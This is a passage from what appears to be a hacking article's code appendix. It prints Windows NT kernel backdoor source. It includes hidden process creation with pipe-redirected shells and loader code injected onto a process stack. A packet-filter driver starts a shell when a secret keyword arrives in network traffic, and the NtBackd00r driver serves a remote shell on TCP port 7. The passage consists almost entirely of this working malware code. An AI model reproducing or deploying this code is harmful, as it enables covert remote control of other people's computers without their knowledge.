+                RtlCopyMemory((PCHAR)(lpp)+lpp->Size,WindowTitle->Buffer,WindowTitle->Length);
+                lpp->WindowTitle.Buffer=(PWCHAR)lpp->Size;
+                lpp->Size+=WindowTitle->MaximumLength;
+        }
+        if(Desktop){
+                lpp->Desktop.Length=Desktop->Length;
+                lpp->Desktop.MaximumLength=Desktop->MaximumLength;
+                RtlCopyMemory((PCHAR)(lpp)+lpp->Size,Desktop->Buffer,Desktop->Length);
+                lpp->Desktop.Buffer=(PWCHAR)lpp->Size;
+                lpp->Size+=Desktop->MaximumLength;
+        }
+        if(Reserved){
+                lpp->Reserved2.Length=Reserved->Length;
+                lpp->Reserved2.MaximumLength=Reserved->MaximumLength;
+                RtlCopyMemory((PCHAR)(lpp)+lpp->Size,Reserved->Buffer,Reserved->Length);
+                lpp->Reserved2.Buffer=(PWCHAR)lpp->Size;
+                lpp->Size+=Reserved->MaximumLength;
+        }
+/*        if(Reserved2){
+                lpp->Reserved3.Length=Reserved2->Length;
+                lpp->Reserved3.MaximumLength=Reserved2->MaximumLength;
+                RtlCopyMemory((PCHAR)(lpp)+lpp->Size,Reserved2->Buffer,Reserved2->Length);
+                lpp->Reserved3.Buffer=(PWCHAR)lpp->Size;
+                lpp->Size+=Reserved2->MaximumLength;
+        }*/
+}
+
+VOID CreateProcessParameters(HANDLE hProcess, NT::PPEB Peb,
+                             NT::PUNICODE_STRING ImageFile, HANDLE hPipe)
+{
+    NT::PPROCESS_PARAMETERS pp;
+        NT::UNICODE_STRING                CurrentDirectory;                                
+        NT::UNICODE_STRING                DllPath;                                
+
+        NT::RtlInitUnicodeString(&CurrentDirectory,L"C:\\WINNT\\SYSTEM32\\");
+        NT::RtlInitUnicodeString(&DllPath,L"C:\\;C:\\WINNT\\;C:\\WINNT\\SYSTEM32\\");
+        
+
+
+    RtlCreateProcessParameters(&pp, ImageFile, &DllPath,&CurrentDirectory, ImageFile, 0, 0, 0, 0, 0);
+        
+        pp->hStdInput=hPipe;
+    pp->hStdOutput=hPipe;//hStdOutPipe;
+    pp->hStdError=hPipe;//hStdOutPipe;
+        pp->dwFlags=STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+        pp->wShowWindow=SW_HIDE;//CREATE_NO_WINDOW;
+
+    pp->Environment = InitEnvironment(hProcess);
+        
+    ULONG n = pp->Size;
+    PVOID p = 0;
+    NT::ZwAllocateVirtualMemory(hProcess, &p, 0, &n,
+                                MEM_COMMIT, PAGE_READWRITE);
+
+    ZwWriteVirtualMemory(hProcess, p, pp, pp->Size, 0);
+
+    ZwWriteVirtualMemory(hProcess, PCHAR(Peb) + 0x10, &p, sizeof p, 0);
+
+    RtlDestroyProcessParameters(pp);
+}
+
+namespace NT {
+extern "C" {
+DWORD WINAPI RtlCreateAcl(PACL acl,DWORD size,DWORD rev);
+BOOL      WINAPI RtlAddAccessAllowedAce(PACL,DWORD,DWORD,PSID);
+}}
+
+NTSTATUS BuildAlowingSD(PSECURITY_DESCRIPTOR *pSecurityDescriptor)
+{
+        //_asm int 3;
+        SID SeWorldSid={SID_REVISION, 1, SECURITY_WORLD_SID_AUTHORITY, SECURITY_WORLD_RID};
+        SID localSid={SID_REVISION, 1, SECURITY_NT_AUTHORITY, SECURITY_LOCAL_SYSTEM_RID};
+        char daclbuf[PAGE_SIZE];
+        NT::PACL dacl = (NT::PACL)&daclbuf;
+        char sdbuf[PAGE_SIZE];
+        NT::PSECURITY_DESCRIPTOR sd = &sdbuf;
+        
+        NTSTATUS status = NT::RtlCreateAcl(dacl, PAGE_SIZE, ACL_REVISION);
+    if (!NT_SUCCESS(status)) return status;
+    status = NT::RtlAddAccessAllowedAce(dacl, ACL_REVISION, FILE_ALL_ACCESS, &SeWorldSid);
+    if (!NT_SUCCESS(status)) return status;
+    RtlZeroMemory(sd, PAGE_SIZE);
+    status = NT::RtlCreateSecurityDescriptor(sd, SECURITY_DESCRIPTOR_REVISION);
+    if (!NT_SUCCESS(status)) return status;
+    status = RtlSetOwnerSecurityDescriptor(sd, &localSid, FALSE);
+    if (!NT_SUCCESS(status)) return status;
+    status = NT::RtlSetDaclSecurityDescriptor(sd, TRUE, dacl, FALSE);
+    if (!NT_SUCCESS(status)) return status;
+    if (!NT::RtlValidSecurityDescriptor(sd)) {
+        _asm int 3;
+    }
+        
+        //To try!
+        ULONG buflen = PAGE_SIZE*2;
+        *pSecurityDescriptor = NT::ExAllocatePool(NT::PagedPool, buflen);
+    if (!*pSecurityDescriptor) return STATUS_INSUFFICIENT_RESOURCES;
+        return RtlAbsoluteToSelfRelativeSD(sd, *pSecurityDescriptor, &buflen);
+}
+
+#define PIPE_NAME_MAX 40*2
+
+extern "C" NTSTATUS myCreatePipe1(PHANDLE phPipe, NT::PUNICODE_STRING PipeName, IN ACCESS_MASK DesiredAccess, PSECURITY_DESCRIPTOR sd, ULONG ShareAccess)
+{
+        NT::IO_STATUS_BLOCK                iosb;
+        
+        NT::OBJECT_ATTRIBUTES attr = {sizeof attr, 0, PipeName, OBJ_INHERIT, sd};
+        NT::LARGE_INTEGER nTimeOut;
+        nTimeOut.QuadPart = (__int64)-1E7;
+        return ZwCreateNamedPipeFile(phPipe, DesiredAccess | SYNCHRONIZE | FILE_ATTRIBUTE_TEMPORARY, &attr, &iosb, ShareAccess,
+                FILE_CREATE, 0, FALSE, FALSE, FALSE, 1, 0x1000, 0x1000, &nTimeOut);        
+}
+
+int exec_piped(NT::PUNICODE_STRING name, NT::PUNICODE_STRING PipeName)
+{
+    HANDLE hProcess, hThread, hSection, hFile;
+        
+        //_asm int 3;
+
+    NT::OBJECT_ATTRIBUTES oa = {sizeof oa, 0, name, OBJ_CASE_INSENSITIVE};
+    NT::IO_STATUS_BLOCK iosb;
+    NT::ZwOpenFile(&hFile, FILE_EXECUTE | SYNCHRONIZE, &oa, &iosb,
+                   FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
+
+    oa.ObjectName = 0;
+        
+    NT::ZwCreateSection(&hSection, SECTION_ALL_ACCESS, &oa, 0,
+                        PAGE_EXECUTE, SEC_IMAGE, hFile);
+
+    NT::ZwClose(hFile);
+
+        ZwCreateProcess(&hProcess, PROCESS_ALL_ACCESS, &oa,
+                        NtCurrentProcess(), TRUE, hSection, 0, 0);
+        
+    NT::SECTION_IMAGE_INFORMATION sii;
+    NT::ZwQuerySection(hSection, NT::SectionImageInformation,
+                       &sii, sizeof sii, 0);
+
+    NT::ZwClose(hSection);
+
+    NT::USER_STACK stack = {0};
+
+    ULONG n = sii.StackReserve;
+    NT::ZwAllocateVirtualMemory(hProcess, &stack.ExpandableStackBottom, 0, &n,
+                                MEM_RESERVE, PAGE_READWRITE);
+
+    stack.ExpandableStackBase = PCHAR(stack.ExpandableStackBottom)
+                              + sii.StackReserve;
+    stack.ExpandableStackLimit = PCHAR(stack.ExpandableStackBase)
+                               - sii.StackCommit;
+
+        /* PAGE_EXECUTE_READWRITE is needed if initialisation code will be executed on stack*/
+        n = sii.StackCommit + PAGE_SIZE;
+    PVOID p = PCHAR(stack.ExpandableStackBase) - n;
+    NT::ZwAllocateVirtualMemory(hProcess, &p, 0, &n,
+                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    ULONG x; n = PAGE_SIZE;
+    ZwProtectVirtualMemory(hProcess, &p, &n,
+                               PAGE_READWRITE | PAGE_GUARD, &x);
+
+    NT::CONTEXT context = {CONTEXT_FULL};
+    context.SegGs = 0;
+    context.SegFs = 0x38;
+    context.SegEs = 0x20;
+    context.SegDs = 0x20;
+    context.SegSs = 0x20;
+    context.SegCs = 0x18;
+    context.EFlags = 0x3000;
+    context.Esp = ULONG(stack.ExpandableStackBase) - 4;
+    context.Eip = ULONG(sii.EntryPoint);
+
+    NT::CLIENT_ID cid;
+
+    ZwCreateThread(&hThread, THREAD_ALL_ACCESS, &oa,
+                       hProcess, &cid, &context, &stack, TRUE);
+
+    NT::PROCESS_BASIC_INFORMATION pbi;
+    NT::ZwQueryInformationProcess(hProcess, NT::ProcessBasicInformation,
+                                  &pbi, sizeof pbi, 0);
+        
+        HANDLE hPipe,hPipe1;
+        oa.ObjectName = PipeName;
+        oa.Attributes = OBJ_INHERIT;
+        if(NT::ZwOpenFile(&hPipe1, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &oa, &iosb, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE)) return 0;
+        NT::ZwDuplicateObject(NtCurrentProcess(), hPipe1, hProcess, &hPipe,
+                0, 0, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE);
+        
+        CreateProcessParameters(hProcess, pbi.PebBaseAddress, name, hPipe);
+
+    InformCsrss(hProcess, hThread,
+                ULONG(cid.UniqueProcess), ULONG(cid.UniqueThread));
+        
+    ZwResumeThread(hThread, 0);
+
+    NT::ZwClose(hProcess);
+    NT::ZwClose(hThread);
+
+    return int(cid.UniqueProcess);
+}
+
+int execute_piped(VOID *ImageFileName, NT::PUNICODE_STRING PipeName)
+{
+    NT::UNICODE_STRING ImageFile;
+    NT::RtlInitUnicodeString(&ImageFile, (wchar_t *)ImageFileName);
+    return exec_piped(&ImageFile, PipeName);
+}
+
+
+----[ 8.5 - NebbetCreateProcess.diff
+
+268a269,384
+> typedef
+> WINBASEAPI
+> BOOL
+> (WINAPI
+> *f_SetStdHandle)(
+>     IN DWORD nStdHandle,
+>     IN HANDLE hHandle
+>     );
+> typedef
+> WINBASEAPI
+> HANDLE
+> (WINAPI
+> *f_CreateFileW)(
+>     IN LPCWSTR lpFileName,
+>     IN DWORD dwDesiredAccess,
+>     IN DWORD dwShareMode,
+>     IN LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+>     IN DWORD dwCreationDisposition,
+>     IN DWORD dwFlagsAndAttributes,
+>     IN HANDLE hTemplateFile
+>     );
+> #ifdef _DEBUG
+> typedef
+> WINBASEAPI
+> DWORD
+> (WINAPI
+> *f_GetLastError)(
+>     VOID
+>     );
+> #endif
+> typedef VOID (*f_EntryPoint)(VOID);
+>
+> struct s_data2embed
+> {
+>         wchar_t PipeName[PIPE_NAME_MAX];
+>         //wchar_t RPipeName[PIPE_NAME_MAX], WPipeName[PIPE_NAME_MAX];
+>         f_SetStdHandle pSetStdHandle;
+>         f_CreateFileW pCreateFileW;
+>         f_EntryPoint EntryPoint;
+> #ifdef _DEBUG
+>         f_GetLastError pGetLastError;
+> #endif
+> };
+>
+> //void before_code2embed(){};
+> void code2embed(s_data2embed *embedded_data)
+> {
+>         HANDLE hPipe;
+>
+>         __asm int 3;
+>         hPipe = embedded_data->pCreateFileW(embedded_data->PipeName,
+>                 GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
+>                 0/*FILE_SHARE_READ | FILE_SHARE_WRITE*/,
+>                 NULL,
+>                 OPEN_EXISTING,
+>                 0/*FILE_ATTRIBUTE_NORMAL*/,
+>                 NULL);
+>         embedded_data->pGetLastError();
+>         /*//if (hRPipe==INVALID_HANDLE_VALUE) goto cont;
+>         hWPipe = embedded_data->pCreateFileW(embedded_data->WPipeName,
+>                 GENERIC_WRITE | SYNCHRONIZE,
+>                 FILE_SHARE_READ /*| FILE_SHARE_WRITE*,
+>                 NULL,
+>                 OPEN_EXISTING,
+>                 0,
+>                 NULL);
+>         embedded_data->pGetLastError();
+>         if ((hRPipe!=INVALID_HANDLE_VALUE)&&(hWPipe!=INVALID_HANDLE_VALUE)) */
+>         if (hPipe!=INVALID_HANDLE_VALUE)
+>         {
+>                 embedded_data->pSetStdHandle(STD_INPUT_HANDLE, hPipe);
+>                 embedded_data->pSetStdHandle(STD_OUTPUT_HANDLE, hPipe);
+>                 embedded_data->pSetStdHandle(STD_ERROR_HANDLE, hPipe);
+>         }
+>         embedded_data->EntryPoint();
+> }
+> __declspec(naked) void after_code2embed(){};
+> #define sizeof_code2embed ((ULONG)&after_code2embed-(ULONG)&code2embed)
+>
+> void redir2pipe(HANDLE hProcess, wchar_t *PipeName/*, wchar_t *WPipeName*/, PVOID EntryPoint, PVOID pStack, /*OUT PULONG pData,*/ OUT PULONG pCode, OUT PULONG pNewStack)
+> {
+>         s_data2embed data2embed;
+>         PVOID pKERNEL32;
+>         NT::UNICODE_STRING ModuleFileName;
+>         
+>         _asm int 3;
+>
+>         *pCode = 0;
+>         *pNewStack = 0;
+>         NT::RtlInitUnicodeString(&ModuleFileName, L"kernel32.dll");
+>         LdrGetDllHandle(NULL, NULL, &ModuleFileName, &pKERNEL32);
+>         if (!pKERNEL32) return;
+>         data2embed.pSetStdHandle=(f_SetStdHandle)FindFunc(pKERNEL32, "SetStdHandle");
+>         data2embed.pCreateFileW=(f_CreateFileW)FindFunc(pKERNEL32, "CreateFileW");
+> #ifdef _DEBUG
+>         data2embed.pGetLastError=(f_GetLastError)FindFunc(pKERNEL32, "GetLastError");
+> #endif
+>         if ((!data2embed.pSetStdHandle)||(!data2embed.pCreateFileW)) return;
+>         data2embed.EntryPoint=(f_EntryPoint)EntryPoint;
+>         wcscpy(data2embed.PipeName, PipeName);
+>         //wcscpy(data2embed.WPipeName, WPipeName);
+>         char* p = (char*)pStack - sizeof_code2embed;
+>         if (ZwWriteVirtualMemory(hProcess, p, &code2embed, sizeof_code2embed, 0)) return;
+>         *pCode = (ULONG)p;
+>         
+>         p -= sizeof s_data2embed;
+>         if (ZwWriteVirtualMemory(hProcess, p, &data2embed, sizeof s_data2embed, 0)) return;
+>         
+>         PVOID pData = (PVOID)p;
+>         p -= sizeof pData;
+>         if (ZwWriteVirtualMemory(hProcess, p, &pData, sizeof pData, 0)) return;
+>         
+>         p -= 4;
+>         *pNewStack = (ULONG)p;
+> }
+>
+317a434,437
+>         ULONG newEIP, NewStack;
+>         redir2pipe(hProcess, PipeName->Buffer, sii.EntryPoint, stack.ExpandableStackBase, &newEIP, &NewStack);
+>         if ((!NewStack)||(!newEIP)) return 0;
+>
+326,327c446,449
+<     context.Esp = ULONG(stack.ExpandableStackBase) - 4;
+<     context.Eip = ULONG(sii.EntryPoint);
+---
+>         //loader code is on the stack
+>         context.Esp = NewStack;
+>     context.Eip = newEIP;
+
+
+----[ 8.6 - NtdllDynamicLoader.cpp
+
+#include <ntdll.h>
+//#include "UndocKernel.h"
+#include "DynLoadFromNtdll.h"
+
+//Example A.2 from Nebbet's book
+
+//Search loaded module by name
+PVOID FindModule(char *module)
+{
+        ULONG n;
+        //Request necessary size of buffer
+        NT::ZwQuerySystemInformation(NT::SystemModuleInformation,
+                                 &n, 0, &n);
+        //Allocate memory for n structures
+    PULONG q = (PULONG)NT::ExAllocatePool(NT::NonPagedPool,n*sizeof(*q));
+        //Request information about modules
+    NT::ZwQuerySystemInformation(NT::SystemModuleInformation,
+                                 q, n * sizeof *q, 0);
+
+        //Module counter located at address q, information begins at q+1
+    NT::PSYSTEM_MODULE_INFORMATION p
+        = NT::PSYSTEM_MODULE_INFORMATION(q + 1);
+    PVOID ntdll = 0;
+
+        //Cycle for each module ...
+        for (ULONG i = 0; i < *q; i++)
+        {
+                //...compare it's name with looked for...
+                if (_stricmp(p[i].ImageName + p[i].ModuleNameOffset,
+                     module) == 0)
+                {
+                        //...and stop if module found
+                        ntdll = p[i].Base;
+                        break;
+                }
+        }
+        //Free memory
+    NT::ExFreePool(q);
+    return ntdll;
+}
+
+PVOID FindNT()
+{
+    return FindModule("ntdll.dll");
+}
+
+//Search exported function named Name in module, loaded at addrress Base
+PVOID FindFunc(PVOID Base, PCSTR Name)
+{
+        //At addrress Base there is DOS EXE header
+        PIMAGE_DOS_HEADER dos = PIMAGE_DOS_HEADER(Base);
+        //Extract offset of PE-header from it
+    PIMAGE_NT_HEADERS nt = PIMAGE_NT_HEADERS(PCHAR(Base) + dos->e_lfanew);
+        //Evaluate pointer to section table,
+        //according to directory of exported functions
+    PIMAGE_DATA_DIRECTORY expdir
+        = nt->OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT;
+        //Extract address and size of that table
+    ULONG size = expdir->Size;
+    ULONG addr = expdir->VirtualAddress;
+
+        //Evaluate pointers:
+        // - to directory of exported functions
+    PIMAGE_EXPORT_DIRECTORY exports
+        = PIMAGE_EXPORT_DIRECTORY(PCHAR(Base) + addr);
+        // - to table of addresses
+    PULONG functions = PULONG(PCHAR(Base) + exports->AddressOfFunctions);
+        // - to table of ordinals
+    PSHORT ordinals  = PSHORT(PCHAR(Base) + exports->AddressOfNameOrdinals);
+        // - to table of names
+    PULONG names     = PULONG(PCHAR(Base) + exports->AddressOfNames);
+
+    //Cycle through table of names ...
+        for (ULONG i = 0; i < exports->NumberOfNames; i++) {
+                //Ordinal that matches name is index in the table of addresses
+        ULONG ord = ordinals[i];
+                //Test is the address correct
+        if (functions[ord] < addr  ||  functions[ord] >= addr + size) {
+                        //If function name matches looked for...
+            if (strcmp(PSTR(PCHAR(Base) + names[i]), Name) == 0)
+                                //then return it's address
+                return PCHAR(Base) + functions[ord];
+        }
+    }
+        //Function not found
+    return 0;
+}
+
+
+----[ 8.7 - Filtering.cpp
+
+extern "C" {
+#include <ntddk.h>
+#include <ntddndis.h>
+#include <pfhook.h>
+#include "filtering.h"
+#include "Sniffer.h"
+
+NTSYSAPI
+NTSTATUS
+NTAPI
+ZwLoadDriver(
+    IN PUNICODE_STRING DriverServiceName
+    );
+}
+
+
+extern PF_FORWARD_ACTION PacketFilter(
+  IN IPHeader *PacketHeader,
+  IN unsigned char *Packet,
+  IN unsigned int PacketLength,
+  IN unsigned int RecvInterfaceIndex,
+  IN unsigned int SendInterfaceIndex,
+  IN IPAddr RecvLinkNextHop,
+  IN IPAddr SendLinkNextHop
+  );
+
+NTSTATUS globalresult;
+PDEVICE_OBJECT  pDeviceObject;
+PFILE_OBJECT  pFileObject;
+KEVENT Event;
+        
+NTSTATUS SutdownFiltering()
+{
+        if ((pDeviceObject)&&(pFileObject))
+        {
+                globalresult=SetupFiltering(NULL);
+                ObDereferenceObject(pFileObject);
+                return globalresult;
+        }
+        else return STATUS_SUCCESS;
+}
+
+
+NTSTATUS InitFiltering()
+{
+        UNICODE_STRING FiltDrvName;
+        UNICODE_STRING DSN={0};
+        //_asm int 3;
+        RtlInitUnicodeString(&FiltDrvName,L"\\Device\\IPFILTERDRIVER");
+        pDeviceObject=NULL;
+retry:
+        IoGetDeviceObjectPointer(&FiltDrvName,SYNCHRONIZE|GENERIC_READ|GENERIC_WRITE,&pFileObject,&pDeviceObject);
+        if ((!pDeviceObject)&&(!DSN.Length))
+        {
+                RtlInitUnicodeString(&DSN,L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\IpFilterDriver");
+                ZwLoadDriver(&DSN);
+                goto retry;
+        }
+        if (pDeviceObject)
+        {
+                KeInitializeEvent(&Event,NotificationEvent,FALSE);
+                return SetupFiltering(&PacketFilter);
+        } else return STATUS_OBJECT_NAME_NOT_FOUND;
+}
+
+NTSTATUS SetupFiltering(void *PacketFilterProc)
+{
+        IO_STATUS_BLOCK iostb;
+        LARGE_INTEGER Timeout;
+        PIRP pirp = NULL;
+        //_asm int 3;
+        pirp = IoBuildDeviceIoControlRequest(IOCTL_PF_SET_EXTENSION_POINTER,pDeviceObject,(PPF_SET_EXTENSION_HOOK_INFO)&PacketFilterProc,sizeof(PF_SET_EXTENSION_HOOK_INFO),NULL,0,FALSE,&Event,&iostb);
+        if (!pirp)
+        {
+                return STATUS_UNSUCCESSFUL;
+        }
+        globalresult=IoCallDriver(pDeviceObject,pirp);
+        if (globalresult == STATUS_PENDING)
+        {
+                Timeout.QuadPart=100000000;
+                if (KeWaitForSingleObject(&Event,Executive,KernelMode,FALSE,&Timeout)!=STATUS_SUCCESS)
+                        return STATUS_UNSUCCESSFUL;
+                globalresult = pirp->IoStatus.Status;
+        }        
+        return globalresult;
+}
+
+
+----[ 8.8 - MPFD_main.cpp
+
+extern "C" {
+#include <ntddk.h>
+#include <ntddndis.h>
+#include <pfhook.h>
+#include "Sniffer.h"
+#include "Filtering.h"
+}
+
+extern VOID ShellStarter(VOID* StartShellEvent);
+HANDLE hShellStarterTread=NULL;
+BOOLEAN Terminating=FALSE;
+KEVENT StartShellEvent;
+
+unsigned char * __cdecl memfind(
+        const unsigned char * str1,
+                unsigned int n1,
+        const unsigned char * str2,
+                unsigned int n2
+        )
+{
+                if (n2>n1) return NULL;
+
+        unsigned char *cp = (unsigned char *) str1;
+        unsigned char *s1, *s2;
+                unsigned int x;
+
+        for (unsigned int i=0;i<=n1-n2;i++)
+        {
+                s1 = cp;
+                s2 = (unsigned char *) str2;
+                                x=n2;
+
+                while (x && !(*s1-*s2) )
+                        s1++, s2++, x--;
+                                if (!x) return(cp);
+                cp++;
+        }
+        return(NULL);
+}
+
+unsigned char keyword[]="\x92\x98\xC7\x68\x9F\xF9\x42\xA9\xB2\xD8\x38\x5C\x8C\x31\xE1\xD6";
+
+PF_FORWARD_ACTION PacketFilter(
+  IN IPHeader *PacketHeader,
+  IN unsigned char *Packet,
+  IN unsigned int PacketLength,
+  IN unsigned int RecvInterfaceIndex,
+  IN unsigned int SendInterfaceIndex,
+  IN IPAddr RecvLinkNextHop,
+  IN IPAddr SendLinkNextHop
+  )
+{
+        if (memfind(Packet,PacketLength,keyword,sizeof(keyword)))
+        {
+                HANDLE ThreadHandle;
+                KeSetEvent(&StartShellEvent, 0, FALSE);                
+        }
+        return PF_PASS;
+}
+
+NTSTATUS
+OnStubDispatch(
+    IN PDEVICE_OBJECT DeviceObject,
+    IN PIRP           Irp
+    )
+{
+    Irp->IoStatus.Status      = STATUS_SUCCESS;
+    IoCompleteRequest (Irp,
+                       IO_NO_INCREMENT
+                       );
+    return Irp->IoStatus.Status;
+}
+
+VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
+{
+#if (DBG)
+        DbgPrint("MPFD: OnUnload called\n");
+#endif
+        PVOID ThreadObj;
+        SutdownFiltering();
+        if (hShellStarterTread)
+        {
+                Terminating=TRUE;
+                ObReferenceObjectByHandle(hShellStarterTread, THREAD_ALL_ACCESS, NULL, KernelMode, &ThreadObj, NULL);
+                KeSetEvent(&StartShellEvent, 0, TRUE);
+                KeWaitForSingleObject(ThreadObj, Executive, KernelMode, FALSE, NULL);        
+        }
+}
+
+#pragma code_seg("INIT")
+
+NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
+{
+        NTSTATUS status;
+
+#if (DBG)
+        DbgPrint("MPFD:In DriverEntry\n");
+#endif
+        UNREFERENCED_PARAMETER(RegistryPath);
+
+        for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
+        {
+                DriverObject->MajorFunction[i] = OnStubDispatch;
+           }
+        DriverObject->DriverUnload  = OnUnload;
+        
+        status=InitFiltering();
+        if (status!=STATUS_SUCCESS) return status;
+        KeInitializeEvent(&StartShellEvent,SynchronizationEvent,FALSE);
+        OBJECT_ATTRIBUTES attr={sizeof(OBJECT_ATTRIBUTES), 0,NULL, OBJ_CASE_INSENSITIVE};
+        status=PsCreateSystemThread(&hShellStarterTread, THREAD_ALL_ACCESS, &attr, 0, NULL, ShellStarter, &StartShellEvent);
+        
+        return status;
+}
+
+
+----[ 8.9 - NtBackd00r.cpp
+
+// NtBackd00r.cpp
+//
+// Generated by Driver::Wizard version 2.0
+
+#define VDW_MAIN
+#include <vdw.h>
+#include <stdio.h>
+#include <ntifs.h>
+#include "function.h"
+#include "NtBackd00r.h"
+#pragma hdrstop("NtBackd00r.pch")
+
+#if (DBG)
+#define dprintf DbgPrint
+#else
+#define dprintf
+#endif
+
+extern "C" {
+        NTSYSAPI
+                NTSTATUS
+                NTAPI
+                ZwWaitForMultipleObjects(
+                IN ULONG HandleCount,
+                IN PHANDLE Handles,
+                IN WAIT_TYPE WaitType,
+                IN BOOLEAN Alertable,
+                IN PLARGE_INTEGER Timeout OPTIONAL
+                );
+        
+        NTSYSAPI
+                NTSTATUS
+                NTAPI
+                ZwCreateEvent(
+                OUT PHANDLE EventHandle,
+                IN ACCESS_MASK DesiredAccess,
+                IN POBJECT_ATTRIBUTES ObjectAttributes,
+                IN EVENT_TYPE EventType,
+                IN BOOLEAN InitialState
+                );
+        
+        NTSYSAPI
+                NTSTATUS
+                NTAPI
+                ZwSetEvent(
+                IN HANDLE EventHandle,
+                OUT PULONG PreviousState OPTIONAL
+                );
+}
+
+extern "C" void LoadFuncs();
+extern "C" HANDLE StartShell(PHANDLE phPipe);
+extern VOID ShellStarter(VOID* StartShellEvent);
+
+/////////////////////////////////////////////////////////////////////
+// Begin INIT section
+#pragma code_seg("INIT")
+
+DECLARE_DRIVER_CLASS(NtBackd00r, NULL)
+
+/////////////////////////////////////////////////////////////////////
+// Driver Entry
+//
+NTSTATUS NtBackd00r::DriverEntry(PUNICODE_STRING RegistryPath)
+{
+        UNREFERENCED_PARAMETER(RegistryPath);
+        
+        //Dynamic import of functions exported from ntdll.dll
+        LoadFuncs();
+        
+        // Initialize the TDIClient framework first
+        if (!KTDInterface::Initialize())
+        {
+                // something wrong with TDI
+                return STATUS_NOT_FOUND;
+        }
+        
+        // Create TCP server, port 7
+        CIPTRANSPORT_ADDRESS TCP_port(IPPORT_ECHO);
+        m_pListener = new(NonPagedPool) KStreamServer<Session> (TCP_port);
+        
+        // If succeeded - enable network events
+        
+    if (m_pListener && m_pListener->IsCreated()) {
+        m_pListener->SetEvents(TRUE);
+        dprintf("NtBackd00rDevice: Listener started\n");
+    }
+    else {
+        dprintf("NtBackd00rDevice: Failed to start (port conflict?)\n");
+        return STATUS_INSUFFICIENT_RESOURCES;
+    }
+        
+        //Create dummy device for IoQueueWorkItem
+        m_pDummyDevice = new(NonPagedPool) DummyDevice(NULL, FILE_DEVICE_UNKNOWN, NULL);
+        
+        if (m_pDummyDevice  == NULL)
+        {
+                return STATUS_INSUFFICIENT_RESOURCES;
+        }
+        
+        return STATUS_SUCCESS;
+}
+
+
+#pragma code_seg()
+#pragma warning( disable : 4706 )
+
+//This message will be sen to client in case of failure when starting shell
+char errtxt_shell[]="cant start shell";
+
+//////////////////////////////////////////////////////////////////////////////
+//        Unload is responsible for releasing any system objects that
+//        the driver has allocated.
+//
+VOID NtBackd00r::Unload(VOID)
+{
+        
+    if (m_pListener)
+        {
+                // Disable network event notifications
+                m_pListener->SetEvents(FALSE);
+                
+                // Iterate through the list of active sessions
+                // and forcefully disconnect all active sessions
+                Session* p;
+                TDI_STATUS Status;
+                
+                while ( p = m_ActiveSessionList.RemoveHead() )
+                {
+                        // Thread handle must be extracted before dele p
+                        HANDLE hWorkerThread = p->hDataPumpThread;
+                        // By default, this method will perform an
+                        // abortive disconnect (RST)
+                        Status = p->disconnect();
+                        ASSERT(TDI_PENDING == Status || TDI_SUCCESS == Status);
+                        delete p;
+                        // It's required to wait for termination of worker threads,
+                        // or else unloading driver will cause BSOD
+                        if (hWorkerThread) ZwWaitForSingleObject(hWorkerThread, FALSE, NULL);
+                }
+                
+                // Wait for all outstanding requests to complete
+                // By issuing a disconnect for all sessions, any
+                // pending requests should be completed by the transport
+                m_pListener->Wait();
+                
+                // destroy the socket
+                delete m_pListener;
+                m_pListener = NULL;
+                
+                dprintf("NtBackd00rDevice: Listener stopped\n");
+        }
+        
+        delete m_pDummyDevice;
+        
+        // Call base class destructor to delete all devices.
+        KDriver::Unload();
+}
+
+// Frees buffers, given to ZwWriteFile for asynchronous write
+VOID NTAPI ApcCallbackWriteComplete(
+                                                                        IN PVOID ApcContext,
+                                                                        IN PIO_STATUS_BLOCK IoStatusBlock,
+                                                                        IN ULONG Reserved
+                                                                        )
+{
+        UNREFERENCED_PARAMETER(IoStatusBlock);
+        UNREFERENCED_PARAMETER(Reserved);
+        
+        //
+        delete (uchar *)ApcContext;
+}
+
+#define SENDS_QUEUED_THRESHOLD 3
+
+// Thread, that transfers data between named pipe and socket
+VOID DataPumpThread(IN PVOID thiz1)
+{
+        IO_STATUS_BLOCK send_iosb, rcv_iosb;
+        uchar *send_buf, *rcv_buf;
+        ULONG rd;
+        const bufsize=0x1000;
+        NTSTATUS status;
+        LARGE_INTEGER  ResendInterval;
+        //loacl copy of Pipes needed for correct thread termination
+        //after deleting Session
+        s_Pipes *Pipes;  
+
+        
+        Session* thiz=(Session*)thiz1;
+        Pipes=thiz->m_Pipes;
+        ResendInterval.QuadPart = (__int64)1E6; //0.1c
+        
+        //Create FIFO
+        //Source of BSOD at high IRQL
+        thiz->pWBytePipe = new(NonPagedPool) KLockableFifo<UCHAR>(0x100000, NonPagedPool);
+        //Lock socket to avoid sudden deletion of it
+        thiz->Lock();
+        
+        //send_buf alocated here, deleted in OnSendComplete
+        send_buf = new(NonPagedPool) uchar[bufsize];        
+        //Start asynchronous read
+        status=ZwReadFile(Pipes->hPipe, Pipes->hPipeEvents[1], NULL, NULL, &send_iosb, send_buf, bufsize, NULL, NULL);
+        if (status==STATUS_SUCCESS)
+        {
+                //Send read data to client
+                status=thiz->send(send_buf, send_iosb.Information, send_buf);
+                if ((status!=STATUS_PENDING)&&(status!=STATUS_SUCCESS))
+                        dprintf("send error %08x\n");
+                //to avoid recurring send of same data
+                send_iosb.Status = -1;
+        }
+        while (1) switch (ZwWaitForMultipleObjects(2, &Pipes->hPipeEvents[0], WaitAny, TRUE, NULL))
+        {
+                //STATUS_WAIT_1 - read operation completed
+        case STATUS_WAIT_1:
+                //
+                if (Pipes->Terminating) goto fin;
+                if (!Pipes->hPipe) break;
+sending:
+                {
+                        if (!send_iosb.Status)
+                        {
+resend:
+                        //Send read data to client
+                        status=thiz->send(send_buf, send_iosb.Information, send_buf);
+                        //If there wan an error, then it tried to push too much data in socket
